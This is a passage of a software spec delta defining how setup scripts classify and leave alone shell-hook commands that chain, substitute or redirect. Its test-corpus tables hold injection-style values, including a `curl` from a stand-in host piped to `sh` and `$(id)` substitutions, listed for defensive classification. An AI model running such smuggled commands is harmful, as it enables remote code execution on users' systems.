---
id: "0247"
slug: mempalace-transcript-hook-typescript
status: approved
complexity: standard
interaction-mode: MINIMAL
related-issue: 1329
version: 2.0.0
---

# MemPalace transcript hook in TypeScript

*Delta 03 of `specs/0247-mempalace-transcript-hook-typescript.md`, cumulative
over delta-01 and delta-02. Source: ticket #1329, seat finding `i1-F5`
(`class: spec`) of `review/1329` on PR #1486
(<https://github.com/crewrig/crewrig/pull/1486#issuecomment-6034183319>). The
security hardening S1 of the implementation PR (PR B) added a shell-safety
test to both twins of the transcript predicate: `isShellSafe` in
`scripts/lib/transcript-recognition.ts` (`:74-93`, applied at `:97`) and
`sr_tr_safe` in `scripts/lib/usage-capture-optin.sh` (`:224-234`), both at
`fb2668be` on `feat/1329-mempalace-transcript-typescript`. A command that
requirement 24's grammar recognises but that fails the test was classed `no`.
The approved text classed it by its prefix names instead, so S1 narrowed
requirement 24 without normative text. The narrowing also broke requirement
26. On the enable path, `sr_event_has_transcript` (`:311` at `fb2668be`)
counts only commands that are not `no` (`sr_is_transcript_any`, `:280`).
Setup therefore added the direct form beside such a command, and the event
recorded twice. The corpus row
`MEMPALACE_TRANSCRIPT_ENABLED="1" bash /x/mempalace-transcript.sh` (`:163` of
`scripts/tests/fixtures/mempalace-transcript/recognition-corpus.json` at
`fb2668be`) pins that case.*

*The owner decided on 2026-10-07 that such a command is `foreign-prefix`: left
byte-identical, reported, and nothing added to its event, on every path and on
all four CLIs, with the qualification of requirement 23(c) for Antigravity
CLI's named hook. Asked the same day about the forms that chain, substitute or
redirect, the owner chose the same class for all of them, with no separate
`no` group. That ruling also covers a command the recognition signature cannot
parse, when it carries such syntax and names the hook script as a path word,
such as `bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh`.
PR B implements the ruling in commit `72dd0c76` on
`feat/1329-mempalace-transcript-typescript`: `classOfParse` and
`classifyTranscript` in `scripts/lib/transcript-recognition.ts` (`:77-157`),
and `sr_tr_safety`, `sr_tr_shaped_unsafe` and `sr_transcript_class_of` in
`scripts/lib/usage-capture-optin.sh` (`:224-291`). Both twins agree on all 99
rows of the corpus at that commit. Line references below without a commit are
to that commit.*

*This delta records the shell-safety rule and the out-of-signature rule in
requirement 24, the reporting in requirement 25, the "never two" rule for this
class in requirement 26, and the tests and corpus in requirement 32. It changes
no behaviour of the hook. It runs under the release-branch regime of
`specs/0215-shell-to-typescript-migration.delta-04.md`, and its spec-PR
targets `release/1231-ts-migration`. Spec 0215 and its deltas 01 to 04 say
nothing about the classes of requirement 24, so this delta contradicts none of
them. The version is a MAJOR bump. Commands the approved text classed
`legacy-enabled` or `legacy-unmarked`, and so rewrote or removed, are now left
byte-identical. Commands it classed `no` now block the add on their event.
One such case is a command setup itself wrote. Setup writes the prefix
`MEMPALACE_PYTHON=$MEMPALACE_PYTHON_BIN` with the detected interpreter path
unquoted (`scripts/setup-gemini-interactive.sh:429-431`,
`scripts/setup-copilot-interactive.sh:419-421` and
`scripts/setup-antigravity-interactive.sh:459-461` on
`release/1231-ts-migration`). When that path holds a character the
shell-safety rule of requirement 24 now rejects, such as `#`, `~`, `{`, `[`,
`*` or `'`, the command setup wrote is `foreign-prefix`. It is left
byte-identical and reported, it is no longer migrated, and its event receives
no direct form. This side effect is accepted. Quoting the value would not
avoid it, because a quote is itself outside the safe-character set of the
rule. No question is left open.*

## ADDED

**Scenario:** A transcript command carrying shell syntax blocks the add on every CLI

Given, on one event of each of the four CLIs' user-level configurations, the
command `MEMPALACE_TRANSCRIPT_ENABLED="1" bash /x/hooks/mempalace-transcript.sh`,
and on another event the command
`bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh`. On
Antigravity CLI, each sits in its event's array inside the
`crewrig-mempalace-transcript` named hook, beside an own `legacy-enabled`
command.
When setup runs and the user enables session recording, then, on a copy of
the same configuration, when the user declines, and then when the user cancels
Then on every path both commands stay byte-identical, and neither event
receives a direct-form command. The report names each command by the event
and the script path it names. For the first, it gives the name
`MEMPALACE_TRANSCRIPT_ENABLED` and not its value. For the second, which
carries no assignment, it says that the command keeps a command line the
framework does not write. On Antigravity CLI, the enable path removes the own
`legacy-enabled` command from each array and keeps every other element, per
requirement 23(c). The decline and cancel paths rewrite that own command in
place, per requirement 23. On every CLI, every event ends with at most one
transcript command that setup wrote or rewrote, and an event holding one of
the two commands above gets none.

**Scenario:** An operator command that names the hook script beside shell syntax blocks the add

Given, on an event the manifest registers, the operator's command
`cat /x/hooks/mempalace-transcript.sh | wc`, which never runs the hook
When setup runs and the user enables session recording
Then both twins class that command `foreign-prefix`. It stays byte-identical
and is reported, and the event receives no direct-form command, so session
recording does not fire on that event until the operator removes or changes
the command. This is the accepted cost of the owner's ruling of 2026-10-07.
The commands `cat /x/hooks/mempalace-transcript.sh.bak | wc -l` and
`echo mempalace-transcript.sh; ls` stay `no`, because neither names
`/mempalace-transcript.sh` or `/mempalace-transcript.ts` as a whole path word.

**Scenario:** The corpus pins the shell-safety class in both twins

Given `scripts/tests/fixtures/mempalace-transcript/recognition-corpus.json`
at the implementation PR's head, holding 99 rows
When the Bash predicate and the TypeScript recogniser classify every row
Then both return the row's `transcript` value. These 21 rows exist at
`fb2668be`, classed `no` there, and keep their command:

| Command | Class |
|---|---|
| `MEMPALACE_TRANSCRIPT_ENABLED="1" bash /x/mempalace-transcript.sh` | `foreign-prefix` |
| `bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `bash /repo/hooks/mempalace-transcript.sh; rm -rf /tmp/x` | `foreign-prefix` |
| `bash $(echo /repo)/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 backup.sh;/bin/bash /repo/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=x;notify-send;true bash /repo/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=$(curl${IFS}-s${IFS}evil\|sh) bash /repo/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `` MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=`id` bash /repo/hooks/mempalace-transcript.sh `` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 node /a\|/repo/hooks/mempalace-transcript.ts` | `foreign-prefix` |
| `prep&&/usr/bin/env bash /repo/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `prep;/bin/bash /repo/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `bash /opt/prep.sh;/repo/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `bash /opt/prep.sh&&/repo/mempalace-transcript.sh` | `foreign-prefix` |
| `bash "$(prep)/repo/hooks/mempalace-transcript.sh"` | `foreign-prefix` |
| `` bash "`prep`/repo/hooks/mempalace-transcript.sh" `` | `foreign-prefix` |
| `bash /repo/hooks/mempalace-transcript.sh` + line feed + `prep` | `foreign-prefix` |
| `bash /repo/hooks/mempalace-transcript.sh Stop` + carriage return | `foreign-prefix` |
| `bash "$(pwd)/hooks/mempalace-transcript.sh"` | `foreign-prefix` |
| `` node "`pwd`/hooks/mempalace-transcript.ts" claude-code `` | `foreign-prefix` |
| `X=$(id) node "/x/hooks/mempalace-transcript.ts" claude-code` | `foreign-prefix` |
| `bash '/x/$(id)/hooks/mempalace-transcript.sh'` | `foreign-prefix` |

These 25 rows are added:

| Command | Class |
|---|---|
| `MEMPALACE_TRANSCRIPT_ENABLED='1' bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=$HOME/py MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=/opt/py\3 MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=/opt/py* MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=/opt/py? MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=/opt/py[3] MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=/opt/{py,py3} MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=a#b MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=~/py MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=a&b MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=a\|b MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=a<b MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=a>b MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_PYTHON=(a) MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `/opt/b*n/bash /x/hooks/mempalace-transcript.sh` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED="1" node "/x/hooks/mempalace-transcript.ts" claude-code` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED="1" bash "/x/hooks/mempalace-transcript.sh" Stop` | `foreign-prefix` |
| `bash /x/hooks/mempalace-transcript.sh \| tee /tmp/log` | `foreign-prefix` |
| `bash /x/hooks/mempalace-transcript.sh > /tmp/log` | `foreign-prefix` |
| `bash /x/hooks/mempalace-transcript.sh < /dev/null` | `foreign-prefix` |
| `bash /x/hooks/mempalace-transcript.sh &` | `foreign-prefix` |
| `(bash /x/hooks/mempalace-transcript.sh)` | `foreign-prefix` |
| `node "/x/hooks/mempalace-transcript.ts" claude-code; true` | `foreign-prefix` |
| `cat /x/hooks/mempalace-transcript.sh.bak \| wc -l` | `no` |
| `echo mempalace-transcript.sh; ls` | `no` |

These rows keep their class:

| Command | Class |
|---|---|
| `bash "$CLAUDE_PROJECT_DIR/hooks/mempalace-transcript.sh"` | `legacy-unmarked` |
| `set NoDefaultCurrentDirectoryInExePath=1&& node C:/Users/ana/crewrig/hooks/mempalace-transcript.ts claude-code` | `direct` |
| `bash "/x/hooks/mempalace-transcript.sh" Stop extra` | `no` |

In these tables, `\|` stands for a single `|`, and "+ line feed" or "+
carriage return" stands for that one character inside the command string.

**Out of scope:** Some commands that the shell can run as the hook stay `no`,
and this delta does not change them. On the enable path, such an event
receives the direct form beside the command and records twice. One kind is a
command outside the recognition signature that carries none of the syntax of
the out-of-signature rule of requirement 24. An example is a quoted prefix
value holding a space,
`MEMPALACE_PYTHON="/a b/py" MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/hooks/mempalace-transcript.sh`.
The other kind is the argument forms requirement 24 has excluded since
delta-01, such as `Stop extra`, which the hook still accepts as shape (b).
Both twins class these `no` at `72dd0c76`. Neither is caused by S1, and
neither is part of finding `i1-F5`. Changing them needs its own ticket,
because it widens the grammar that C1's and C2's shared signature serves.

## MODIFIED

### Requirement 24 — the shell-safety rule and its class (seat finding i1-F5, owner decision of 2026-10-07)

The original below is requirement 24 as delta-01 replaced it.

Original:

<!-- markdownlint-disable-next-line MD029 -->
> 24. **Recognition by content (reworded at delta-01).** A registered command is
>     a transcript command when its whole shape matches. That shape is: an
>     optional prefix of `NAME=value` words, an optional `env`, an optional
>     `bash`, `sh` or `node`, and a script path ending in
>     `/mempalace-transcript.sh` or `/mempalace-transcript.ts`, quoted or not.
>     After the path comes an argument list in one of the four forms setup has
>     ever written, its words separated by whitespace and trailing whitespace
>     allowed: (i) no argument; (ii) exactly one word of ASCII letters that is
>     not a CLI identifier, the legacy Antigravity event; (iii) exactly one of
>     `claude-code`, `gemini-cli` or `copilot-cli`; (iv) `antigravity-cli`
>     followed by exactly one word of ASCII letters. For the Antigravity CLI
>     descriptor only, the guarded prefix of spec 0243 delta-03 requirement 34
>     may stand in place of that prefix. In the classes below, "shape (a) or
>     (b)" means forms (i) and (ii), and "shape (c)" means forms (iii) and (iv).
>     This recognition grammar is narrower than the runtime acceptance of
>     requirement 3, which stays as written. An empty first argument, further
>     arguments after a legacy event, and a CLI identifier followed by the
>     wrong number of arguments are shapes the hook accepts or ends when it
>     runs. They are never transcript commands, because a command that names a
>     script called `mempalace-transcript.*` with other arguments is not one
>     (last sentence of this requirement). Every transcript command SHALL fall
>     in exactly one class, decided from the command text alone:
>     (a) `foreign-prefix` — its prefix carries an assignment to a name other than
>     `MEMPALACE_TRANSCRIPT_ENABLED` and `MEMPALACE_PYTHON`, or it has the direct
>     shape (c) and carries any `NAME=value` prefix;
>     (b) `direct` — shape (c) with no prefix, or with the guarded prefix only;
>     (c) `legacy-enabled` — shape (a) or (b) whose prefix is made of
>     `MEMPALACE_TRANSCRIPT_ENABLED=1` and at most one
>     `MEMPALACE_PYTHON=<non-blank word>`. This is the prefix setup writes today
>     (`scripts/setup-gemini-interactive.sh:429-431`,
>     `scripts/setup-copilot-interactive.sh:419-421`,
>     `scripts/setup-antigravity-interactive.sh:459-461`);
>     (d) `legacy-unmarked` — shape (a) or (b) with no prefix, or with a prefix
>     made only of those two names in which `MEMPALACE_TRANSCRIPT_ENABLED` is
>     absent or not `1`. One transcript-only predicate SHALL exist in each twin:
>     a new Bash predicate in `scripts/lib/usage-capture-optin.sh` and the
>     TypeScript recogniser. Each SHALL return the class or "not a transcript
>     command", and the two SHALL return the same answer for every row of a new
>     corpus, `scripts/tests/fixtures/mempalace-transcript/recognition-corpus.json`.
>     Each row carries a `command`, a `transcript` field holding one of `no`,
>     `direct`, `legacy-enabled`, `legacy-unmarked` or `foreign-prefix`, and a
>     `note`. The corpus SHALL include, classed `no`, a row with the arguments
>     `--foo bar` and a row with the arguments `Stop extra`. Since C2,
>     `sr_is_own` (`scripts/lib/usage-capture-optin.sh:233`) reads
>     `sr_is_transcript or sr_is_guard` (`:211-218`, `:224-231`). It SHALL come
>     to mean "the transcript predicate returns `direct`, `legacy-enabled` or
>     `legacy-unmarked`, or the command is a worktree git guard command". That
>     change SHALL be made by re-expressing `sr_is_transcript` alone. The guard
>     half, `sr_is_guard`, keeps accepting and rejecting exactly what it
>     accepts and rejects today, so guard ownership and the guard refresh of
>     `sr_merge` are unchanged (requirement 29). The transcript half changes on
>     purpose. It now rejects a `foreign-prefix` command, which it accepted. It
>     now accepts the `node` and `.ts` forms and the legacy Antigravity event
>     argument, which it rejected. The existing corpus
>     `scripts/tests/fixtures/usage-capture/recognition-corpus.json`, its
>     `capture` field and its two consumers stay unchanged. A command that
>     chains an operator's own script, or names a script called
>     `mempalace-transcript.*` with other arguments, is not a transcript
>     command and SHALL never be rewritten, kept, deduplicated or removed,
>     except inside Antigravity CLI's `crewrig-mempalace-transcript` named
>     hook, which requirement 23(c) treats per event.

Replacement:

<!-- markdownlint-disable-next-line MD029 -->
> 24. **Recognition by content (reworded at delta-01, shell-safety rule added
>     at delta-03, out-of-signature rule added at delta-03).** A registered
>     command is a transcript command when its whole shape matches, or when
>     the out-of-signature rule below reaches it. That shape is: an optional prefix of `NAME=value`
>     words, an optional `env`, an optional `bash`, `sh` or `node`, and a
>     script path ending in `/mempalace-transcript.sh` or
>     `/mempalace-transcript.ts`, quoted or not. In that prefix, a value, and
>     the directory part before `env` or before the interpreter, are any run of
>     non-whitespace characters. An unquoted script path is any run of
>     characters other than whitespace and quotes. A quoted one is any run of
>     characters other than its own quote. After the path comes an argument
>     list in one of the four forms setup has ever written, its words separated
>     by whitespace and trailing whitespace allowed: (i) no argument; (ii)
>     exactly one word of ASCII letters that is not a CLI identifier, the
>     legacy Antigravity event; (iii) exactly one of `claude-code`,
>     `gemini-cli` or `copilot-cli`; (iv) `antigravity-cli` followed by exactly
>     one word of ASCII letters. Throughout this grammar, whitespace includes
>     the line feed and the carriage return. For the Antigravity CLI descriptor
>     only, the guarded prefix of spec 0243 delta-03 requirement 34 may stand
>     in place of that prefix. In the classes below, "shape (a) or (b)" means
>     forms (i) and (ii), and "shape (c)" means forms (iii) and (iv). This
>     recognition grammar is narrower than the runtime acceptance of
>     requirement 3, which stays as written. An empty first argument, further
>     arguments after a legacy event, and a CLI identifier followed by the
>     wrong number of arguments are shapes the hook accepts or ends when it
>     runs. They are never transcript commands, because a command that names a
>     script called `mempalace-transcript.*` with other arguments is not one
>     (last sentence of this requirement).
>
>     **Shell-safety rule.** A command whose whole shape matches passes this
>     rule when all three of the following hold, and fails it otherwise:
>     (1) the command holds no line feed (U+000A), no carriage return
>     (U+000D), no `;`, no backquote, and not the two characters `$(` in
>     sequence. This applies to the guarded form too, whose fixed prefix holds
>     none of them;
>     (2) unless it carries the guarded prefix, its script path, quotes
>     removed, holds none of `;`, `&`, `|`, `<`, `>`, `(`, `)`, the backquote
>     and the backslash, and not the two characters `$(` in sequence. A `$`
>     followed by anything else is allowed there, as in
>     `"$CLAUDE_PROJECT_DIR/hooks/mempalace-transcript.sh"`;
>     (3) unless it carries the guarded prefix, its whole prefix reads, in
>     order: optional spaces or horizontal tabs; zero or more words `NAME=value`,
>     each followed by one or more spaces or horizontal tabs, where `NAME` is
>     an ASCII letter or underscore followed by ASCII letters, digits or
>     underscores; an optional `env`, followed by one or more spaces or
>     horizontal tabs; and an optional `bash`, `sh` or `node`, followed by one
>     or more spaces or horizontal tabs. `env` and the interpreter may each be
>     preceded by a directory part ending in `/`. Every value and every
>     directory part SHALL consist only of safe characters. A safe character is
>     any character other than whitespace, `;`, `&`, `|`, `<`, `>`, `(`, `)`,
>     `$`, the backquote, the backslash, `"`, `'`, `*`, `?`, `[`, `]`, `{`,
>     `}`, `#` and `~`. A command carrying the guarded prefix is exempt from (2)
>     and (3). That prefix is a fixed string the framework writes, its `&&`
>     included. The path grammar of the guarded form, from spec 0243 delta-03
>     requirement 34, already excludes whitespace, quotes, the backslash, `&`,
>     `|`, `<`, `>`, `^`, `%`, parentheses, `$` and the backquote. The
>     arguments need no
>     character test beyond (1), because the grammar admits only ASCII letters
>     and whitespace there. PR B implements this rule as `shellSafety`
>     (`scripts/lib/transcript-recognition.ts:90-123`), and as `sr_tr_safety`
>     with the whole-command test of `sr_transcript_class_of`
>     (`scripts/lib/usage-capture-optin.sh:235-241`, `:272-279`), with the same
>     character sets.
>
>     **Out-of-signature rule.** A registered command whose whole shape does
>     not match is still a transcript command, always of class
>     `foreign-prefix`, when both of the following hold of its text. When the
>     command starts with the guarded prefix
>     `set NoDefaultCurrentDirectoryInExePath=1&&` and its trailing space, that prefix is removed
>     first, because its `&&` is the framework's own and is not counted as
>     syntax.
>     (A) It holds at least one of `;`, `&`, `|`, `<`, `>`, `(`, `)`, the
>     backquote, a line feed or a carriage return, or the two characters `$(`
>     in sequence. A `$` followed by anything else, a quote, a glob or brace
>     character, `#` and `~` do not count here.
>     (B) It holds `/mempalace-transcript.sh` or `/mempalace-transcript.ts`
>     immediately followed by the end of the command, whitespace, a quote, or
>     one of `;`, `&`, `|`, `<`, `>`, `(`, `)` and the backquote. This means
>     that it names the hook script as a whole path word.
>     Such a command can chain, substitute or redirect around a run of the
>     hook, as in `bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh`.
>     It can also merely name the script, as in
>     `cat /x/hooks/mempalace-transcript.sh | wc`. The rule does not tell the
>     two apart, so the second also blocks the add on its event and is
>     reported. That is the accepted cost of the owner's ruling of 2026-10-07.
>     A name with no `/` before it, as in `echo mempalace-transcript.sh; ls`,
>     and a longer file name, as in `/x/hooks/mempalace-transcript.sh.bak`,
>     fail (B). PR B implements this rule as the last step of
>     `classifyTranscript` (`SHELL_SYNTAX` and `SCRIPT_MENTION`,
>     `scripts/lib/transcript-recognition.ts:99-102`, `:150-156`) and as
>     `sr_tr_shaped_unsafe` (`scripts/lib/usage-capture-optin.sh:263-266`).
>
>     Every transcript command SHALL fall in exactly one class, decided from
>     the command text alone, the shell-safety rule first:
>     (a) `foreign-prefix` — it is a transcript command only under the
>     out-of-signature rule; or it fails the shell-safety rule, whatever its
>     argument form and whatever names its prefix assigns; or its prefix
>     carries an assignment to a name other than
>     `MEMPALACE_TRANSCRIPT_ENABLED` and `MEMPALACE_PYTHON`; or it has the
>     direct shape (c) and carries any `NAME=value` prefix;
>     (b) `direct` — shape (c) with no prefix, or with the guarded prefix only;
>     (c) `legacy-enabled` — shape (a) or (b) whose prefix is made of
>     `MEMPALACE_TRANSCRIPT_ENABLED=1` and at most one
>     `MEMPALACE_PYTHON=<non-blank word>`. This is the prefix setup writes today
>     (`scripts/setup-gemini-interactive.sh:429-431`,
>     `scripts/setup-copilot-interactive.sh:419-421`,
>     `scripts/setup-antigravity-interactive.sh:459-461`);
>     (d) `legacy-unmarked` — shape (a) or (b) with no prefix, or with a prefix
>     made only of those two names in which `MEMPALACE_TRANSCRIPT_ENABLED` is
>     absent or not `1`. Classes (b) to (d) apply only to a command whose
>     whole shape matches and that passes the shell-safety rule. A command
>     that fails it, or that the out-of-signature rule reaches, can chain,
>     substitute or redirect, and the shell may still run the hook. It belongs to the
>     operator: setup SHALL neither rewrite it nor remove it, because that
>     would drop the operator's syntax. Setup SHALL count it as a transcript
>     command on its event, because an added direct form would then record
>     the event twice. Class (a) gives both, with requirements 23, 25 and 26.
>     One transcript-only predicate SHALL exist in each twin:
>     a new Bash predicate in `scripts/lib/usage-capture-optin.sh` and the
>     TypeScript recogniser. Each SHALL return the class or "not a transcript
>     command", and the two SHALL return the same answer for every row of a new
>     corpus, `scripts/tests/fixtures/mempalace-transcript/recognition-corpus.json`.
>     Each row carries a `command`, a `transcript` field holding one of `no`,
>     `direct`, `legacy-enabled`, `legacy-unmarked` or `foreign-prefix`, and a
>     `note`. The corpus SHALL include, classed `no`, a row with the arguments
>     `--foo bar` and a row with the arguments `Stop extra`. Requirement 32
>     states its other rows, those of the shell-safety and out-of-signature
>     rules included. Since C2,
>     `sr_is_own` (`scripts/lib/usage-capture-optin.sh:233`) reads
>     `sr_is_transcript or sr_is_guard` (`:211-218`, `:224-231`). It SHALL come
>     to mean "the transcript predicate returns `direct`, `legacy-enabled` or
>     `legacy-unmarked`, or the command is a worktree git guard command". That
>     change SHALL be made by re-expressing `sr_is_transcript` alone. The guard
>     half, `sr_is_guard`, keeps accepting and rejecting exactly what it
>     accepts and rejects today, so guard ownership and the guard refresh of
>     `sr_merge` are unchanged (requirement 29). The transcript half changes on
>     purpose. It now rejects a `foreign-prefix` command, which it accepted,
>     and that includes every command that fails the shell-safety rule. It
>     never accepts a command of the out-of-signature rule. It
>     now accepts the `node` and `.ts` forms and the legacy Antigravity event
>     argument, which it rejected. The existing corpus
>     `scripts/tests/fixtures/usage-capture/recognition-corpus.json`, its
>     `capture` field and its two consumers stay unchanged. A command whose
>     whole shape does not match, and that the out-of-signature rule does not
>     reach, is not a transcript command. It SHALL never be rewritten, kept,
>     deduplicated or removed, except inside Antigravity CLI's
>     `crewrig-mempalace-transcript` named hook, which requirement 23(c) treats
>     per event. Examples are a command that names a script called
>     `mempalace-transcript.*` with other arguments and none of the syntax of
>     (A), such as `bash "/x/hooks/mempalace-transcript.sh" Stop extra`, and a
>     quoted prefix value holding a space. Two kinds of command are
>     transcript commands of class `foreign-prefix`, even when they chain or
>     substitute: a command whose shape matches but that fails the
>     shell-safety rule, and a command of the out-of-signature rule, such as
>     `bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh`.

### Requirement 25 — reporting a command left by the shell-safety or out-of-signature rule (seat finding i1-F5)

Original:

<!-- markdownlint-disable-next-line MD029 -->
> 25. **Target and left commands.** Setup SHALL rewrite a recognised transcript
>     command to the `.ts` of the checkout running setup, whatever path the
>     command names, because the legacy paths name copies setup made from
>     whichever checkout ran it last (`scripts/lib/common.sh:2369`). On every
>     path — enable, decline or cancel — it SHALL leave a `foreign-prefix`
>     command byte-identical and report it with the assignment that made it so,
>     so that an operator's own setting is never dropped silently (as spec 0243
>     delta-01 does for capture commands); and on the enable path it SHALL add no
>     transcript command on an event that holds one, by the rule of
>     requirement 23. It SHALL leave the installed copies under the
>     CLIs' directories on disk and report their paths as no longer used.

Replacement:

<!-- markdownlint-disable-next-line MD029 -->
> 25. **Target and left commands (reworded at delta-03).** Setup SHALL rewrite
>     a recognised transcript command of an own class (`direct`,
>     `legacy-enabled`, `legacy-unmarked`) to the `.ts` of the checkout running
>     setup, whatever path the command names, because the legacy paths name
>     copies setup made from whichever checkout ran it last
>     (`scripts/lib/common.sh:2369`). On every path (enable, decline or
>     cancel), it SHALL leave a `foreign-prefix` command byte-identical and
>     report it, so that an operator's own setting is never dropped silently
>     (as spec 0243 delta-01 does for capture commands). The report SHALL name
>     the event and the script path the command names, quotes removed, and
>     SHALL give the reason. When the command's whole shape matches and its
>     prefix carries assignments, the reason names those assignments by their
>     `NAME` alone. Otherwise, as for a command of the out-of-signature rule of
>     requirement 24, the reason is that the command keeps a command line the
>     framework does not write. The report SHALL never print an assignment
>     value, because a value may be a credential. On the enable path, setup
>     SHALL add no transcript command on an event that holds one,
>     `foreign-prefix` commands included, whichever rule of requirement 24
>     classed them, by the rule of requirement 23. It SHALL leave the installed
>     copies under the CLIs' directories on disk and report their paths as no
>     longer used.

### Requirement 26 — "never two" holds for every `foreign-prefix` command (seat finding i1-F5)

The original below is requirement 26 as delta-01 replaced it.

Original:

<!-- markdownlint-disable-next-line MD029 -->
> 26. **Idempotence and write safety (reworded at delta-01).** A second run of
>     the rewrite setup makes before the session-recording question SHALL write
>     nothing and create no backup when it runs over a configuration that rewrite
>     has already rewritten. That rewrite is the in-place rewrite of
>     requirement 23, which setup runs on every run before the question,
>     whatever the answer, and on which the decline and cancel paths rely:
>     `direct`,
>     `legacy-enabled` and consented `legacy-unmarked` commands moved to the
>     direct form. The enable path keeps the unconditional backup and write it
>     has today, because requirement 29 lists the only changes made to that
>     path and this is not one of them. A second enable run SHALL instead leave
>     the configuration's content byte-identical to the result of the first.
>     No combination of the session-recording question and the usage-capture
>     question SHALL add a transcript command to an event that already holds
>     one, or leave two transcript commands on one event of one CLI that setup
>     wrote or rewrote. A configuration that already held two before setup ran
>     keeps no more than it held. Every write SHALL be backup-first and end at
>     mode 0600. It SHALL preserve every entry and key it does not own;
>     Antigravity CLI's `crewrig-mempalace-transcript` named hook is owned,
>     within the limits of requirement 23(c). It SHALL refuse a configuration
>     that is not a JSON object, leave the file byte-identical when it fails,
>     and put no configuration content on the argument list of any process
>     (spec 0243 requirement 23).

Replacement:

<!-- markdownlint-disable-next-line MD029 -->
> 26. **Idempotence and write safety (reworded at delta-01 and delta-03).** A
>     second run of
>     the rewrite setup makes before the session-recording question SHALL write
>     nothing and create no backup when it runs over a configuration that rewrite
>     has already rewritten. That rewrite is the in-place rewrite of
>     requirement 23, which setup runs on every run before the question,
>     whatever the answer, and on which the decline and cancel paths rely:
>     `direct`,
>     `legacy-enabled` and consented `legacy-unmarked` commands moved to the
>     direct form. The enable path keeps the unconditional backup and write it
>     has today, because requirement 29 lists the only changes made to that
>     path and this is not one of them. A second enable run SHALL instead leave
>     the configuration's content byte-identical to the result of the first.
>     No combination of the session-recording question and the usage-capture
>     question SHALL add a transcript command to an event that already holds
>     one, or leave two transcript commands on one event of one CLI that setup
>     wrote or rewrote. For this rule, a command classed `foreign-prefix`
>     because it fails the shell-safety rule of requirement 24, or because the
>     out-of-signature rule of that requirement reaches it, is a transcript
>     command its event already holds. In both twins, the test of whether an
>     event holds a transcript command SHALL therefore count every class other
>     than "not a transcript command". A command outside the recognition
>     signature that carries none of the syntax of the out-of-signature rule
>     is classed "not a transcript command", so its event may still receive
>     the direct form and record twice; the *Out of scope* note under ADDED
>     records that pre-existing case. A configuration that already held two
>     before setup ran keeps no more than it held. Every write SHALL be
>     backup-first and end at
>     mode 0600. It SHALL preserve every entry and key it does not own;
>     Antigravity CLI's `crewrig-mempalace-transcript` named hook is owned,
>     within the limits of requirement 23(c). It SHALL refuse a configuration
>     that is not a JSON object, leave the file byte-identical when it fails,
>     and put no configuration content on the argument list of any process
>     (spec 0243 requirement 23).

### Requirement 32 — tests and corpus of the shell-safety class (seat finding i1-F5)

Only one sentence of requirement 32, as delta-02 left it, changes. Every
other sentence, including the paragraph on §5 of
`scripts/tests/test-setup-antigravity-transcript.sh`, stays as written.
Original sentence:

> They SHALL include, for each CLI, the decline path on every class of
> requirement 24 and the enable path on a `foreign-prefix` command, and, on
> Antigravity CLI, both paths on a command that names a script called
> `mempalace-transcript.*` with other arguments inside the
> `crewrig-mempalace-transcript` named hook.

Replacement sentence:

> They SHALL include, for each CLI, the decline path on every class of
> requirement 24. They SHALL also include the enable path on three
> `foreign-prefix` commands: one classed so by an assignment, one by the
> shell-safety rule, and one by the out-of-signature rule. For the last two,
> they SHALL assert that the command stays byte-identical, that its event
> receives no direct-form command, and that the report names the script and
> prints no assignment value. They SHALL cover at least the chained forms
> `prep; …`, a `$(…)` and a backquote substitution in a prefix value, and the
> line-feed chain. On Antigravity CLI, they SHALL include both paths on a
> command that names a script called `mempalace-transcript.*` with other
